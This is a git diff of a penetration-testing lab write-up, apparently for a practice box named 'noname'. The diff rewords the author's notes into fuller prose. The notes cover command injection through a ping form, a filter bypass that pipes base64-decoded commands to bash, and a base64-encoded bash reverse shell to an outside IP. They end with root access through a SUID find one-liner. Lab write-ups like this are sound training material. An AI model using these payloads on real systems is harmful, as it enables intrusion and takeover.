@@ -28,30 +28,25 @@ PORT   STATE SERVICE
 
 ## Port 80 Enumeration
 
-- Enum with Nikto and Gobuster
-- Nikto did not return anthing interesting
-- Gobuster returned `admin` and `superadmin.php`
-    - `admin` only has pictures no functionality
-    - `superadmin.php` looks like we can ping any IP address 
-
+- I started with my usual enumeration of http with Nikto and Gobuster. Nikto did not return anthing interesting while Gobuster returned `admin` and `superadmin.php`
+    - `admin` only has pictures posted with no functionality
+    - `superadmin.php` looks more interesting as looks like there is some ping functionality that we can play with.
 
 
 ![image](\assets\images\noname-pg\2022-07-27-15-23-21.png)
 
-- Checking burp request 
+- Intercepting the request with burp we can see two parameters `pinger` and `submitt`. `pinger` looks really interesting and is screaming command injection :p
 
 ![](\assets\images\noname-pg\2022-07-27-15-42-17.png)
 
 - Trying command injection with `sleep` command.
-    - `;` `&` did not work but `|` worked
+    - I tried `;` and `&` but did not work, while trying `|` worked
 
 ![](\assets\images\noname-pg\2022-07-27-15-43-36.png)
 
-- As we can see from the bottom of the screenshot we were able to successfully inject the `sleep` command for five seconds.
-
-- Tried some basic reverse shell. but did not work.
-- tried `ls` and also did not return anything
-- tried `cat superadmin.php`
+- As we can see from the bottom of the screenshot we were able to successfully inject the `sleep` command resulting for a 5 second delay in the response.
+    - As we have confirmed the command injection vulnerability we can now try some basic [reverse shell payload](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). I tried the bash, nc, and python payloads but nothing worked.
+    - I also tried `ls`, `pwd`, and `cat /etc/passwd` but it also did not return anything, so I tried `cat superadmin.php` and the response returned the following:
 
 ```php
 <?php
@@ -78,36 +73,28 @@ echo "<pre>$outer</pre>";
 ?>
 ```
 
-- looks like there are certain blacklisted characters and commands. that's why we can't `ls` and `cat /etc/passwd`
-- tried echoing a base64 encoded command then pipe to `base64 -d` then to `bash`
+- Looks like there are certain blacklisted characters and commands, that's why we can't `ls` and `cat /etc/passwd`. From here I thought we can try try echoing a base64 encoded command then pipe it to `base64 -d` then to `bash`. Something like the following:
     - `echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash`
 
 ![](\assets\images\noname-pg\2022-07-27-16-26-33.png)
 
-- and it worked.
-
-- tried with a reverse shell `bash -i >& /dev/tcp/192.168.49.210/80 0>&1`
-    - `|echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjIxMC84MCAwPiYx' | base64 -d | bash` did not work for some reason, when `bash` is removed at the end it gives me the following result
+- And it worked, so I tried with a reverse shell `bash -i >& /dev/tcp/192.168.49.210/80 0>&1`
+    - `|echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjIxMC84MCAwPiYx' | base64 -d | bash` did not work for some reason, which is really weird not sure why. So to troubleshoot I tried removing the last `|bash` part in my payload so it will print the base64 decoded payload instead of executing it with bash, and I got the following response
            
         ![](\assets\images\noname-pg\2022-07-27-16-48-44.png)
 
-        - looks like it is not printing the whole base64 encoded command.
-
-    - tried double `base64` encoding and it worked `|echo+'WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRNUxqSXhNQzg0TUNBd1BpWXg='|base64+-d|base64+-d|bash`
+        - Looks like it is not printing the whole base64 encoded command. not sure why but that's the reason our reverse shell is not getting executed properly. From here I tried double `base64` encoding my payload and it worked `|echo+'WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRNUxqSXhNQzg0TUNBd1BpWXg='|base64+-d|base64+-d|bash`
 
         ![](\assets\images\noname-pg\2022-07-27-16-46-09.png)
 
 ## Privesc
 
 
-- we are `www-data` 
-- checking `SUIDs` I noticed `/usr/bin/find` not sure if it is normal but I checked in [GTFObins](https://gtfobins.github.io/gtfobins/find/#suid) and looks like we can privesc using this command.
+- Now we have a shell as `www-data` first thing I check usually is the `SUIDs`. I noticed `/usr/bin/find` not sure if it is normal but I checked in [GTFObins](https://gtfobins.github.io/gtfobins/find/#suid) and looks like we can privesc using this command.
 
 ![](\assets\images\noname-pg\2022-07-27-16-52-16.png)
 
-- `find . -exec /bin/sh \; -quit`
-
-- and we are root.
+- Using the following command `find . -exec /bin/sh \; -quit` gave us root access to the box.
 
 ![](\assets\images\noname-pg\2022-07-27-16-54-22.png)
 
